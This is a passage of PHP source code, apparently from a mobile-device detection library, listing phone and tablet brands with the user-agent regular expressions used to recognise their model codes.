		'Samsung'	   => '\bSamsung\b|SM-G950F|SM-G955F|SM-G9250|GT-19300|SGH-I337|BGT-S5230|GT-B2100|GT-B2700|GT-B2710|GT-B3210|GT-B3310|GT-B3410|GT-B3730|GT-B3740|GT-B5510|GT-B5512|GT-B5722|GT-B6520|GT-B7300|GT-B7320|GT-B7330|GT-B7350|GT-B7510|GT-B7722|GT-B7800|GT-C3010|GT-C3011|GT-C3060|GT-C3200|GT-C3212|GT-C3212I|GT-C3262|GT-C3222|GT-C3300|GT-C3300K|GT-C3303|GT-C3303K|GT-C3310|GT-C3322|GT-C3330|GT-C3350|GT-C3500|GT-C3510|GT-C3530|GT-C3630|GT-C3780|GT-C5010|GT-C5212|GT-C6620|GT-C6625|GT-C6712|GT-E1050|GT-E1070|GT-E1075|GT-E1080|GT-E1081|GT-E1085|GT-E1087|GT-E1100|GT-E1107|GT-E1110|GT-E1120|GT-E1125|GT-E1130|GT-E1160|GT-E1170|GT-E1175|GT-E1180|GT-E1182|GT-E1200|GT-E1210|GT-E1225|GT-E1230|GT-E1390|GT-E2100|GT-E2120|GT-E2121|GT-E2152|GT-E2220|GT-E2222|GT-E2230|GT-E2232|GT-E2250|GT-E2370|GT-E2550|GT-E2652|GT-E3210|GT-E3213|GT-I5500|GT-I5503|GT-I5700|GT-I5800|GT-I5801|GT-I6410|GT-I6420|GT-I7110|GT-I7410|GT-I7500|GT-I8000|GT-I8150|GT-I8160|GT-I8190|GT-I8320|GT-I8330|GT-I8350|GT-I8530|GT-I8700|GT-I8703|GT-I8910|GT-I9000|GT-I9001|GT-I9003|GT-I9010|GT-I9020|GT-I9023|GT-I9070|GT-I9082|GT-I9100|GT-I9103|GT-I9220|GT-I9250|GT-I9300|GT-I9305|GT-I9500|GT-I9505|GT-M3510|GT-M5650|GT-M7500|GT-M7600|GT-M7603|GT-M8800|GT-M8910|GT-N7000|GT-S3110|GT-S3310|GT-S3350|GT-S3353|GT-S3370|GT-S3650|GT-S3653|GT-S3770|GT-S3850|GT-S5210|GT-S5220|GT-S5229|GT-S5230|GT-S5233|GT-S5250|GT-S5253|GT-S5260|GT-S5263|GT-S5270|GT-S5300|GT-S5330|GT-S5350|GT-S5360|GT-S5363|GT-S5369|GT-S5380|GT-S5380D|GT-S5560|GT-S5570|GT-S5600|GT-S5603|GT-S5610|GT-S5620|GT-S5660|GT-S5670|GT-S5690|GT-S5750|GT-S5780|GT-S5830|GT-S5839|GT-S6102|GT-S6500|GT-S7070|GT-S7200|GT-S7220|GT-S7230|GT-S7233|GT-S7250|GT-S7500|GT-S7530|GT-S7550|GT-S7562|GT-S7710|GT-S8000|GT-S8003|GT-S8500|GT-S8530|GT-S8600|SCH-A310|SCH-A530|SCH-A570|SCH-A610|SCH-A630|SCH-A650|SCH-A790|SCH-A795|SCH-A850|SCH-A870|SCH-A890|SCH-A930|SCH-A950|SCH-A970|SCH-A990|SCH-I100|SCH-I110|SCH-I400|SCH-I405|SCH-I500|SCH-I510|SCH-I515|SCH-I600|SCH-I730|SCH-I760|SCH-I770|SCH-I830|SCH-I910|SCH-I920|SCH-I959|SCH-LC11|SCH-N150|SCH-N300|SCH-R100|SCH-R300|SCH-R351|SCH-R400|SCH-R410|SCH-T300|SCH-U310|SCH-U320|SCH-U350|SCH-U360|SCH-U365|SCH-U370|SCH-U380|SCH-U410|SCH-U430|SCH-U450|SCH-U460|SCH-U470|SCH-U490|SCH-U540|SCH-U550|SCH-U620|SCH-U640|SCH-U650|SCH-U660|SCH-U700|SCH-U740|SCH-U750|SCH-U810|SCH-U820|SCH-U900|SCH-U940|SCH-U960|SCS-26UC|SGH-A107|SGH-A117|SGH-A127|SGH-A137|SGH-A157|SGH-A167|SGH-A177|SGH-A187|SGH-A197|SGH-A227|SGH-A237|SGH-A257|SGH-A437|SGH-A517|SGH-A597|SGH-A637|SGH-A657|SGH-A667|SGH-A687|SGH-A697|SGH-A707|SGH-A717|SGH-A727|SGH-A737|SGH-A747|SGH-A767|SGH-A777|SGH-A797|SGH-A817|SGH-A827|SGH-A837|SGH-A847|SGH-A867|SGH-A877|SGH-A887|SGH-A897|SGH-A927|SGH-B100|SGH-B130|SGH-B200|SGH-B220|SGH-C100|SGH-C110|SGH-C120|SGH-C130|SGH-C140|SGH-C160|SGH-C170|SGH-C180|SGH-C200|SGH-C207|SGH-C210|SGH-C225|SGH-C230|SGH-C417|SGH-C450|SGH-D307|SGH-D347|SGH-D357|SGH-D407|SGH-D415|SGH-D780|SGH-D807|SGH-D980|SGH-E105|SGH-E200|SGH-E315|SGH-E316|SGH-E317|SGH-E335|SGH-E590|SGH-E635|SGH-E715|SGH-E890|SGH-F300|SGH-F480|SGH-I200|SGH-I300|SGH-I320|SGH-I550|SGH-I577|SGH-I600|SGH-I607|SGH-I617|SGH-I627|SGH-I637|SGH-I677|SGH-I700|SGH-I717|SGH-I727|SGH-i747M|SGH-I777|SGH-I780|SGH-I827|SGH-I847|SGH-I857|SGH-I896|SGH-I897|SGH-I900|SGH-I907|SGH-I917|SGH-I927|SGH-I937|SGH-I997|SGH-J150|SGH-J200|SGH-L170|SGH-L700|SGH-M110|SGH-M150|SGH-M200|SGH-N105|SGH-N500|SGH-N600|SGH-N620|SGH-N625|SGH-N700|SGH-N710|SGH-P107|SGH-P207|SGH-P300|SGH-P310|SGH-P520|SGH-P735|SGH-P777|SGH-Q105|SGH-R210|SGH-R220|SGH-R225|SGH-S105|SGH-S307|SGH-T109|SGH-T119|SGH-T139|SGH-T209|SGH-T219|SGH-T229|SGH-T239|SGH-T249|SGH-T259|SGH-T309|SGH-T319|SGH-T329|SGH-T339|SGH-T349|SGH-T359|SGH-T369|SGH-T379|SGH-T409|SGH-T429|SGH-T439|SGH-T459|SGH-T469|SGH-T479|SGH-T499|SGH-T509|SGH-T519|SGH-T539|SGH-T559|SGH-T589|SGH-T609|SGH-T619|SGH-T629|SGH-T639|SGH-T659|SGH-T669|SGH-T679|SGH-T709|SGH-T719|SGH-T729|SGH-T739|SGH-T746|SGH-T749|SGH-T759|SGH-T769|SGH-T809|SGH-T819|SGH-T839|SGH-T919|SGH-T929|SGH-T939|SGH-T959|SGH-T989|SGH-U100|SGH-U200|SGH-U800|SGH-V205|SGH-V206|SGH-X100|SGH-X105|SGH-X120|SGH-X140|SGH-X426|SGH-X427|SGH-X475|SGH-X495|SGH-X497|SGH-X507|SGH-X600|SGH-X610|SGH-X620|SGH-X630|SGH-X700|SGH-X820|SGH-X890|SGH-Z130|SGH-Z150|SGH-Z170|SGH-ZX10|SGH-ZX20|SHW-M110|SPH-A120|SPH-A400|SPH-A420|SPH-A460|SPH-A500|SPH-A560|SPH-A600|SPH-A620|SPH-A660|SPH-A700|SPH-A740|SPH-A760|SPH-A790|SPH-A800|SPH-A820|SPH-A840|SPH-A880|SPH-A900|SPH-A940|SPH-A960|SPH-D600|SPH-D700|SPH-D710|SPH-D720|SPH-I300|SPH-I325|SPH-I330|SPH-I350|SPH-I500|SPH-I600|SPH-I700|SPH-L700|SPH-M100|SPH-M220|SPH-M240|SPH-M300|SPH-M305|SPH-M320|SPH-M330|SPH-M350|SPH-M360|SPH-M370|SPH-M380|SPH-M510|SPH-M540|SPH-M550|SPH-M560|SPH-M570|SPH-M580|SPH-M610|SPH-M620|SPH-M630|SPH-M800|SPH-M810|SPH-M850|SPH-M900|SPH-M910|SPH-M920|SPH-M930|SPH-N100|SPH-N200|SPH-N240|SPH-N300|SPH-N400|SPH-Z400|SWC-E100|SCH-i909|GT-N7100|GT-N7105|SCH-I535|SM-N900A|SGH-I317|SGH-T999L|GT-S5360B|GT-I8262|GT-S6802|GT-S6312|GT-S6310|GT-S5312|GT-S5310|GT-I9105|GT-I8510|GT-S6790N|SM-G7105|SM-N9005|GT-S5301|GT-I9295|GT-I9195|SM-C101|GT-S7392|GT-S7560|GT-B7610|GT-I5510|GT-S7582|GT-S7530E|GT-I8750|SM-G9006V|SM-G9008V|SM-G9009D|SM-G900A|SM-G900D|SM-G900F|SM-G900H|SM-G900I|SM-G900J|SM-G900K|SM-G900L|SM-G900M|SM-G900P|SM-G900R4|SM-G900S|SM-G900T|SM-G900V|SM-G900W8|SHV-E160K|SCH-P709|SCH-P729|SM-T2558|GT-I9205|SM-G9350|SM-J120F|SM-G920F|SM-G920V|SM-G930F|SM-N910C|SM-A310F|GT-I9190|SM-J500FN|SM-G903F|SM-J330F',
		'LG'			=> '\bLG\b;|LG[- ]?(C800|C900|E400|E610|E900|E-900|F160|F180K|F180L|F180S|730|855|L160|LS740|LS840|LS970|LU6200|MS690|MS695|MS770|MS840|MS870|MS910|P500|P700|P705|VM696|AS680|AS695|AX840|C729|E970|GS505|272|C395|E739BK|E960|L55C|L75C|LS696|LS860|P769BK|P350|P500|P509|P870|UN272|US730|VS840|VS950|LN272|LN510|LS670|LS855|LW690|MN270|MN510|P509|P769|P930|UN200|UN270|UN510|UN610|US670|US740|US760|UX265|UX840|VN271|VN530|VS660|VS700|VS740|VS750|VS910|VS920|VS930|VX9200|VX11000|AX840A|LW770|P506|P925|P999|E612|D955|D802|MS323|M257)|LM-G710',
		'Sony'		  => 'SonyST|SonyLT|SonyEricsson|SonyEricssonLT15iv|LT18i|E10i|LT28h|LT26w|SonyEricssonMT27i|C5303|C6902|C6903|C6906|C6943|D2533',
		'Asus'		  => 'Asus.*Galaxy|PadFone.*Mobile',
		'NokiaLumia'	=> 'Lumia [0-9]{3,4}',
		// http://www.micromaxinfo.com/mobiles/smartphones
		// Added because the codes might conflict with Acer Tablets.
		'Micromax'	  => 'Micromax.*\b(A210|A92|A88|A72|A111|A110Q|A115|A116|A110|A90S|A26|A51|A35|A54|A25|A27|A89|A68|A65|A57|A90)\b',
		// @todo Complete the regex.
		'Palm'		  => 'PalmSource|Palm', // avantgo|blazer|elaine|hiptop|plucker|xiino ;
		'Vertu'		 => 'Vertu|Vertu.*Ltd|Vertu.*Ascent|Vertu.*Ayxta|Vertu.*Constellation(F|Quest)?|Vertu.*Monika|Vertu.*Signature', // Just for fun ;)
		// http://www.pantech.co.kr/en/prod/prodList.do?gbrand=VEGA (PANTECH)
		// Most of the VEGA devices are legacy. PANTECH seem to be newer devices based on Android.
		'Pantech'	   => 'PANTECH|IM-A850S|IM-A840S|IM-A830L|IM-A830K|IM-A830S|IM-A820L|IM-A810K|IM-A810S|IM-A800S|IM-T100K|IM-A725L|IM-A780L|IM-A775C|IM-A770K|IM-A760S|IM-A750K|IM-A740S|IM-A730S|IM-A720L|IM-A710K|IM-A690L|IM-A690S|IM-A650S|IM-A630K|IM-A600S|VEGA PTL21|PT003|P8010|ADR910L|P6030|P6020|P9070|P4100|P9060|P5000|CDM8992|TXT8045|ADR8995|IS11PT|P2030|P6010|P8000|PT002|IS06|CDM8999|P9050|PT001|TXT8040|P2020|P9020|P2000|P7040|P7000|C790',
		// http://www.fly-phone.com/devices/smartphones/ ; Included only smartphones.
		'Fly'		   => 'IQ230|IQ444|IQ450|IQ440|IQ442|IQ441|IQ245|IQ256|IQ236|IQ255|IQ235|IQ245|IQ275|IQ240|IQ285|IQ280|IQ270|IQ260|IQ250',
		// http://fr.wikomobile.com
		'Wiko'		  => 'KITE 4G|HIGHWAY|GETAWAY|STAIRWAY|DARKSIDE|DARKFULL|DARKNIGHT|DARKMOON|SLIDE|WAX 4G|RAINBOW|BLOOM|SUNSET|GOA(?!nna)|LENNY|BARRY|IGGY|OZZY|CINK FIVE|CINK PEAX|CINK PEAX 2|CINK SLIM|CINK SLIM 2|CINK +|CINK KING|CINK PEAX|CINK SLIM|SUBLIM',
		'iMobile'		=> 'i-mobile (IQ|i-STYLE|idea|ZAA|Hitz)',
		// Added simvalley mobile just for fun. They have some interesting devices.
		// http://www.simvalley.fr/telephonie---gps-_22_telephonie-mobile_telephones_.html
		'SimValley'	 => '\b(SP-80|XT-930|SX-340|XT-930|SX-310|SP-360|SP60|SPT-800|SP-120|SPT-800|SP-140|SPX-5|SPX-8|SP-100|SPX-8|SPX-12)\b',
		 // Wolfgang - a brand that is sold by Aldi supermarkets.
		 // http://www.wolfgangmobile.com/
		'Wolfgang'	  => 'AT-B24D|AT-AS50HD|AT-AS40W|AT-AS55HD|AT-AS45q2|AT-B26D|AT-AS50Q',
		'Alcatel'	   => 'Alcatel',
		'Nintendo'	  => 'Nintendo (3DS|Switch)',
		// http://en.wikipedia.org/wiki/Amoi
		'Amoi'		  => 'Amoi',
		// http://en.wikipedia.org/wiki/INQ
		'INQ'		   => 'INQ',
		'OnePlus'	   => 'ONEPLUS',
		// @Tapatalk is a mobile app; http://support.tapatalk.com/threads/smf-2-0-2-os-and-browser-detection-plugin-and-tapatalk.15565/#post-79039
		'GenericPhone'  => 'Tapatalk|PDA;|SAGEM|\bmmp\b|pocket|\bpsp\b|symbian|Smartphone|smartfon|treo|up.browser|up.link|vodafone|\bwap\b|nokia|Series40|Series60|S60|SonyEricsson|N900|MAUI.*WAP.*Browser',
	);
	protected static $tabletDevices = array(
		// @todo: check for mobile friendly emails topic.
		'iPad'			  => 'iPad|iPad.*Mobile',
		// Removed |^.*Android.*Nexus(?!(?:Mobile).)*$
		// @see #442
		// @todo Merge NexusTablet into GoogleTablet.
		'NexusTablet'	   => 'Android.*Nexus[\s]+(7|9|10)',
		// https://en.wikipedia.org/wiki/Pixel_C
		'GoogleTablet'		   => 'Android.*Pixel C',
		'SamsungTablet'	 => 'SAMSUNG.*Tablet|Galaxy.*Tab|SC-01C|GT-P1000|GT-P1003|GT-P1010|GT-P3105|GT-P6210|GT-P6800|GT-P6810|GT-P7100|GT-P7300|GT-P7310|GT-P7500|GT-P7510|SCH-I800|SCH-I815|SCH-I905|SGH-I957|SGH-I987|SGH-T849|SGH-T859|SGH-T869|SPH-P100|GT-P3100|GT-P3108|GT-P3110|GT-P5100|GT-P5110|GT-P6200|GT-P7320|GT-P7511|GT-N8000|GT-P8510|SGH-I497|SPH-P500|SGH-T779|SCH-I705|SCH-I915|GT-N8013|GT-P3113|GT-P5113|GT-P8110|GT-N8010|GT-N8005|GT-N8020|GT-P1013|GT-P6201|GT-P7501|GT-N5100|GT-N5105|GT-N5110|SHV-E140K|SHV-E140L|SHV-E140S|SHV-E150S|SHV-E230K|SHV-E230L|SHV-E230S|SHW-M180K|SHW-M180L|SHW-M180S|SHW-M180W|SHW-M300W|SHW-M305W|SHW-M380K|SHW-M380S|SHW-M380W|SHW-M430W|SHW-M480K|SHW-M480S|SHW-M480W|SHW-M485W|SHW-M486W|SHW-M500W|GT-I9228|SCH-P739|SCH-I925|GT-I9200|GT-P5200|GT-P5210|GT-P5210X|SM-T311|SM-T310|SM-T310X|SM-T210|SM-T210R|SM-T211|SM-P600|SM-P601|SM-P605|SM-P900|SM-P901|SM-T217|SM-T217A|SM-T217S|SM-P6000|SM-T3100|SGH-I467|XE500|SM-T110|GT-P5220|GT-I9200X|GT-N5110X|GT-N5120|SM-P905|SM-T111|SM-T2105|SM-T315|SM-T320|SM-T320X|SM-T321|SM-T520|SM-T525|SM-T530NU|SM-T230NU|SM-T330NU|SM-T900|XE500T1C|SM-P605V|SM-P905V|SM-T337V|SM-T537V|SM-T707V|SM-T807V|SM-P600X|SM-P900X|SM-T210X|SM-T230|SM-T230X|SM-T325|GT-P7503|SM-T531|SM-T330|SM-T530|SM-T705|SM-T705C|SM-T535|SM-T331|SM-T800|SM-T700|SM-T537|SM-T807|SM-P907A|SM-T337A|SM-T537A|SM-T707A|SM-T807A|SM-T237|SM-T807P|SM-P607T|SM-T217T|SM-T337T|SM-T807T|SM-T116NQ|SM-T116BU|SM-P550|SM-T350|SM-T550|SM-T9000|SM-P9000|SM-T705Y|SM-T805|GT-P3113|SM-T710|SM-T810|SM-T815|SM-T360|SM-T533|SM-T113|SM-T335|SM-T715|SM-T560|SM-T670|SM-T677|SM-T377|SM-T567|SM-T357T|SM-T555|SM-T561|SM-T713|SM-T719|SM-T813|SM-T819|SM-T580|SM-T355Y?|SM-T280|SM-T817A|SM-T820|SM-W700|SM-P580|SM-T587|SM-P350|SM-P555M|SM-P355M|SM-T113NU|SM-T815Y|SM-T585|SM-T285|SM-T825|SM-W708|SM-T835|SM-T830|SM-T837V|SM-T720|SM-T510|SM-T387V', // SCH-P709|SCH-P729|SM-T2558|GT-I9205 - Samsung Mega - treat them like a regular phone.
		// http://docs.aws.amazon.com/silk/latest/developerguide/user-agent.html
		'Kindle'			=> 'Kindle|Silk.*Accelerated|Android.*\b(KFOT|KFTT|KFJWI|KFJWA|KFOTE|KFSOWI|KFTHWI|KFTHWA|KFAPWI|KFAPWA|WFJWAE|KFSAWA|KFSAWI|KFASWI|KFARWI|KFFOWI|KFGIWI|KFMEWI)\b|Android.*Silk/[0-9.]+ like Chrome/[0-9.]+ (?!Mobile)',
		// Only the Surface tablets with Windows RT are considered mobile.
		// http://msdn.microsoft.com/en-us/library/ie/hh920767(v=vs.85).aspx
		'SurfaceTablet'	 => 'Windows NT [0-9.]+; ARM;.*(Tablet|ARMBJS)',
		// http://shopping1.hp.com/is-bin/INTERSHOP.enfinity/WFS/WW-USSMBPublicStore-Site/en_US/-/USD/ViewStandardCatalog-Browse?CatalogCategoryID=JfIQ7EN5lqMAAAEyDcJUDwMT
		'HPTablet'		  => 'HP Slate (7|8|10)|HP ElitePad 900|hp-tablet|EliteBook.*Touch|HP 8|Slate 21|HP SlateBook 10',
		// Watch out for PadFone, see #132.
		// http://www.asus.com/de/Tablets_Mobile/Memo_Pad_Products/
		'AsusTablet'		=> '^.*PadFone((?!Mobile).)*$|Transformer|TF101|TF101G|TF300T|TF300TG|TF300TL|TF700T|TF700KL|TF701T|TF810C|ME171|ME301T|ME302C|ME371MG|ME370T|ME372MG|ME172V|ME173X|ME400C|Slider SL101|\bK00F\b|\bK00C\b|\bK00E\b|\bK00L\b|TX201LA|ME176C|ME102A|\bM80TA\b|ME372CL|ME560CG|ME372CG|ME302KL| K010 | K011 | K017 | K01E |ME572C|ME103K|ME170C|ME171C|\bME70C\b|ME581C|ME581CL|ME8510C|ME181C|P01Y|PO1MA|P01Z|\bP027\b|\bP024\b|\bP00C\b',
		'BlackBerryTablet'  => 'PlayBook|RIM Tablet',
		'HTCtablet'		 => 'HTC_Flyer_P512|HTC Flyer|HTC Jetstream|HTC-P715a|HTC EVO View 4G|PG41200|PG09410',
		'MotorolaTablet'	=> 'xoom|sholest|MZ615|MZ605|MZ505|MZ601|MZ602|MZ603|MZ604|MZ606|MZ607|MZ608|MZ609|MZ615|MZ616|MZ617',
		'NookTablet'		=> 'Android.*Nook|NookColor|nook browser|BNRV200|BNRV200A|BNTV250|BNTV250A|BNTV400|BNTV600|LogicPD Zoom2',
		// http://www.acer.ro/ac/ro/RO/content/drivers
		// http://www.packardbell.co.uk/pb/en/GB/content/download (Packard Bell is part of Acer)
		// http://us.acer.com/ac/en/US/content/group/tablets
		// http://www.acer.de/ac/de/DE/content/models/tablets/
		// Can conflict with Micromax and Motorola phones codes.
		'AcerTablet'		=> 'Android.*; \b(A100|A101|A110|A200|A210|A211|A500|A501|A510|A511|A700|A701|W500|W500P|W501|W501P|W510|W511|W700|G100|G100W|B1-A71|B1-710|B1-711|A1-810|A1-811|A1-830)\b|W3-810|\bA3-A10\b|\bA3-A11\b|\bA3-A20\b|\bA3-A30',
		// http://eu.computers.toshiba-europe.com/innovation/family/Tablets/1098744/banner_id/tablet_footerlink/
		// http://us.toshiba.com/tablets/tablet-finder
		// http://www.toshiba.co.jp/regza/tablet/
		'ToshibaTablet'	 => 'Android.*(AT100|AT105|AT200|AT205|AT270|AT275|AT300|AT305|AT1S5|AT500|AT570|AT700|AT830)|TOSHIBA.*FOLIO',
		// http://www.nttdocomo.co.jp/english/service/developer/smart_phone/technical_info/spec/index.html
		// http://www.lg.com/us/tablets
		'LGTablet'		  => '\bL-06C|LG-V909|LG-V900|LG-V700|LG-V510|LG-V500|LG-V410|LG-V400|LG-VK810\b',
		'FujitsuTablet'	 => 'Android.*\b(F-01D|F-02F|F-05E|F-10D|M532|Q572)\b',
		// Prestigio Tablets http://www.prestigio.com/support
		'PrestigioTablet'   => 'PMP3170B|PMP3270B|PMP3470B|PMP7170B|PMP3370B|PMP3570C|PMP5870C|PMP3670B|PMP5570C|PMP5770D|PMP3970B|PMP3870C|PMP5580C|PMP5880D|PMP5780D|PMP5588C|PMP7280C|PMP7280C3G|PMP7280|PMP7880D|PMP5597D|PMP5597|PMP7100D|PER3464|PER3274|PER3574|PER3884|PER5274|PER5474|PMP5097CPRO|PMP5097|PMP7380D|PMP5297C|PMP5297C_QUAD|PMP812E|PMP812E3G|PMP812F|PMP810E|PMP880TD|PMT3017|PMT3037|PMT3047|PMT3057|PMT7008|PMT5887|PMT5001|PMT5002',
		// http://support.lenovo.com/en_GB/downloads/default.page?#
		'LenovoTablet'	  => 'Lenovo TAB|Idea(Tab|Pad)( A1|A10| K1|)|ThinkPad([ ]+)?Tablet|YT3-850M|YT3-X90L|YT3-X90F|YT3-X90X|Lenovo.*(S2109|S2110|S5000|S6000|K3011|A3000|A3500|A1000|A2107|A2109|A1107|A5500|A7600|B6000|B8000|B8080)(-|)(FL|F|HV|H|)|TB-X103F|TB-X304X|TB-X304F|TB-X304L|TB-X505F|TB-X505L|TB-X505X|TB-X605F|TB-X605L|TB-8703F|TB-8703X|TB-8703N|TB-8704N|TB-8704F|TB-8704X|TB-8704V|TB-7304F|TB-7304I|TB-7304X|Tab2A7-10F|Tab2A7-20F|TB2-X30L|YT3-X50L|YT3-X50F|YT3-X50M|YT-X705F|YT-X703F|YT-X703L|YT-X705L|YT-X705X|TB2-X30F|TB2-X30L|TB2-X30M|A2107A-F|A2107A-H|TB3-730F|TB3-730M|TB3-730X|TB-7504F|TB-7504X',
		// http://www.dell.com/support/home/us/en/04/Products/tab_mob/tablets
		'DellTablet'		=> 'Venue 11|Venue 8|Venue 7|Dell Streak 10|Dell Streak 7',
		// http://www.yarvik.com/en/matrix/tablets/
		'YarvikTablet'	  => 'Android.*\b(TAB210|TAB211|TAB224|TAB250|TAB260|TAB264|TAB310|TAB360|TAB364|TAB410|TAB411|TAB420|TAB424|TAB450|TAB460|TAB461|TAB464|TAB465|TAB467|TAB468|TAB07-100|TAB07-101|TAB07-150|TAB07-151|TAB07-152|TAB07-200|TAB07-201-3G|TAB07-210|TAB07-211|TAB07-212|TAB07-214|TAB07-220|TAB07-400|TAB07-485|TAB08-150|TAB08-200|TAB08-201-3G|TAB08-201-30|TAB09-100|TAB09-211|TAB09-410|TAB10-150|TAB10-201|TAB10-211|TAB10-400|TAB10-410|TAB13-201|TAB274EUK|TAB275EUK|TAB374EUK|TAB462EUK|TAB474EUK|TAB9-200)\b',
		'MedionTablet'	  => 'Android.*\bOYO\b|LIFE.*(P9212|P9514|P9516|S9512)|LIFETAB',
		'ArnovaTablet'	  => '97G4|AN10G2|AN7bG3|AN7fG3|AN8G3|AN8cG3|AN7G3|AN9G3|AN7dG3|AN7dG3ST|AN7dG3ChildPad|AN10bG3|AN10bG3DT|AN9G2',
		// http://www.intenso.de/kategorie_en.php?kategorie=33
		// @todo: http://www.nbhkdz.com/read/b8e64202f92a2df129126bff.html - investigate
		'IntensoTablet'	 => 'INM8002KP|INM1010FP|INM805ND|Intenso Tab|TAB1004',
		// IRU.ru Tablets http://www.iru.ru/catalog/soho/planetable/
		'IRUTablet'		 => 'M702pro',
		'MegafonTablet'	 => 'MegaFon V9|\bZTE V9\b|Android.*\bMT7A\b',
		// http://www.e-boda.ro/tablete-pc.html
		'EbodaTablet'	   => 'E-Boda (Supreme|Impresspeed|Izzycomm|Essential)',
		// http://www.allview.ro/produse/droseries/lista-tablete-pc/
		'AllViewTablet'		   => 'Allview.*(Viva|Alldro|City|Speed|All TV|Frenzy|Quasar|Shine|TX1|AX1|AX2)',
		// http://wiki.archosfans.com/index.php?title=Main_Page
		// @note Rewrite the regex format after we add more UAs.
		'ArchosTablet'	  => '\b(101G9|80G9|A101IT)\b|Qilive 97R|Archos5|\bARCHOS (70|79|80|90|97|101|FAMILYPAD|)(b|c|)(G10| Cobalt| TITANIUM(HD|)| Xenon| Neon|XSK| 2| XS 2| PLATINUM| CARBON|GAMEPAD)\b',
		// http://www.ainol.com/plugin.php?identifier=ainol&module=product
		'AinolTablet'	   => 'NOVO7|NOVO8|NOVO10|Novo7Aurora|Novo7Basic|NOVO7PALADIN|novo9-Spark',
		'NokiaLumiaTablet'  => 'Lumia 2520',
		// @todo: inspect http://esupport.sony.com/US/p/select-system.pl?DIRECTOR=DRIVER
		// Readers http://www.atsuhiro-me.net/ebook/sony-reader/sony-reader-web-browser
		// http://www.sony.jp/support/tablet/
		'SonyTablet'		=> 'Sony.*Tablet|Xperia Tablet|Sony Tablet S|SO-03E|SGPT12|SGPT13|SGPT114|SGPT121|SGPT122|SGPT123|SGPT111|SGPT112|SGPT113|SGPT131|SGPT132|SGPT133|SGPT211|SGPT212|SGPT213|SGP311|SGP312|SGP321|EBRD1101|EBRD1102|EBRD1201|SGP351|SGP341|SGP511|SGP512|SGP521|SGP541|SGP551|SGP621|SGP641|SGP612|SOT31|SGP771|SGP611|SGP612|SGP712',
		// http://www.support.philips.com/support/catalog/worldproducts.jsp?userLanguage=en&userCountry=cn&categoryid=3G_LTE_TABLET_SU_CN_CARE&title=3G%20tablets%20/%20LTE%20range&_dyncharset=UTF-8
		'PhilipsTablet'	 => '\b(PI2010|PI3000|PI3100|PI3105|PI3110|PI3205|PI3210|PI3900|PI4010|PI7000|PI7100)\b',
		// db + http://www.cube-tablet.com/buy-products.html
		'CubeTablet'		=> 'Android.*(K8GT|U9GT|U10GT|U16GT|U17GT|U18GT|U19GT|U20GT|U23GT|U30GT)|CUBE U8GT',
		// http://www.cobyusa.com/?p=pcat&pcat_id=3001
		'CobyTablet'		=> 'MID1042|MID1045|MID1125|MID1126|MID7012|MID7014|MID7015|MID7034|MID7035|MID7036|MID7042|MID7048|MID7127|MID8042|MID8048|MID8127|MID9042|MID9740|MID9742|MID7022|MID7010',
		// http://www.match.net.cn/products.asp
		'MIDTablet'		 => 'M9701|M9000|M9100|M806|M1052|M806|T703|MID701|MID713|MID710|MID727|MID760|MID830|MID728|MID933|MID125|MID810|MID732|MID120|MID930|MID800|MID731|MID900|MID100|MID820|MID735|MID980|MID130|MID833|MID737|MID960|MID135|MID860|MID736|MID140|MID930|MID835|MID733|MID4X10',
		// http://www.msi.com/support
		// @todo Research the Windows Tablets.
		'MSITablet' => 'MSI \b(Primo 73K|Primo 73L|Primo 81L|Primo 77|Primo 93|Primo 75|Primo 76|Primo 73|Primo 81|Primo 91|Primo 90|Enjoy 71|Enjoy 7|Enjoy 10)\b',
		// @todo http://www.kyoceramobile.com/support/drivers/
	//	'KyoceraTablet' => null,
		// @todo http://intexuae.com/index.php/category/mobile-devices/tablets-products/
	//	'IntextTablet' => null,
		// http://pdadb.net/index.php?m=pdalist&list=SMiT (NoName Chinese Tablets)
		// http://www.imp3.net/14/show.php?itemid=20454
		'SMiTTablet'		=> 'Android.*(\bMID\b|MID-560|MTV-T1200|MTV-PND531|MTV-P1101|MTV-PND530)',
		// http://www.rock-chips.com/index.php?do=prod&pid=2
		'RockChipTablet'	=> 'Android.*(RK2818|RK2808A|RK2918|RK3066)|RK2738|RK2808A',
		// http://www.fly-phone.com/devices/tablets/ ; http://www.fly-phone.com/service/
		'FlyTablet'		 => 'IQ310|Fly Vision',
		// http://www.bqreaders.com/gb/tablets-prices-sale.html
		'bqTablet'		  => 'Android.*(bq)?.*\b(Elcano|Curie|Edison|Maxwell|Kepler|Pascal|Tesla|Hypatia|Platon|Newton|Livingstone|Cervantes|Avant|Aquaris ([E|M]10|M8))\b|Maxwell.*Lite|Maxwell.*Plus',
		// http://www.huaweidevice.com/worldwide/productFamily.do?method=index&directoryId=5011&treeId=3290
		// http://www.huaweidevice.com/worldwide/downloadCenter.do?method=index&directoryId=3372&treeId=0&tb=1&type=software (including legacy tablets)
		'HuaweiTablet'	  => 'MediaPad|MediaPad 7 Youth|IDEOS S7|S7-201c|S7-202u|S7-101|S7-103|S7-104|S7-105|S7-106|S7-201|S7-Slim|M2-A01L|BAH-L09|BAH-W09|AGS-L09|CMR-AL19',
		// Nec or Medias Tab
		'NecTablet'		 => '\bN-06D|\bN-08D',
		// Pantech Tablets: http://www.pantechusa.com/phones/
		'PantechTablet'	 => 'Pantech.*P4100',
		// Broncho Tablets: http://www.broncho.cn/ (hard to find)
		'BronchoTablet'	 => 'Broncho.*(N701|N708|N802|a710)',
		// http://versusuk.com/support.html
		'VersusTablet'	  => 'TOUCHPAD.*[78910]|\bTOUCHTAB\b',
		// http://www.zync.in/index.php/our-products/tablet-phablets
		'ZyncTablet'		=> 'z1000|Z99 2G|z930|z990|z909|Z919|z900', // Removed "z999" because of https://github.com/serbanghita/Mobile-Detect/issues/717
		// http://www.positivoinformatica.com.br/www/pessoal/tablet-ypy/
		'PositivoTablet'	=> 'TB07STA|TB10STA|TB07FTA|TB10FTA',
		// https://www.nabitablet.com/
		'NabiTablet'		=> 'Android.*\bNabi',
		'KoboTablet'		=> 'Kobo Touch|\bK080\b|\bVox\b Build|\bArc\b Build',
		// French Danew Tablets http://www.danew.com/produits-tablette.php
		'DanewTablet'	   => 'DSlide.*\b(700|701R|702|703R|704|802|970|971|972|973|974|1010|1012)\b',
		// Texet Tablets and Readers http://www.texet.ru/tablet/
